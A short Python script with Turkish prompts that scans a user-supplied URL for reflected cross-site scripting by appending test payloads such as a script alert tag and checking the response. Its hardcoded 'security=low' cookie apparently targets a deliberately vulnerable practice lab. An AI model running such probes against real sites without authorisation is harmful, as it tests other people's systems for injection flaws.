import requests
urli=input("xss açıklı sitenin url giriniz: ")
header={"Cookie": "security=low; PHPSESSID=a0b29e43b154e8cf261c3a93686bdd94"}
xssl=["hacked","<h1>siber","<script>alert('hacked')</script>"]
for payload in xssl:
    print(payload)
    url=urli+str(payload)
    sonuc=requests.get(url=url,headers=header)
    if str(payload) in str(sonuc.content):
        print("xss var, payloadlar: ",str(payload))
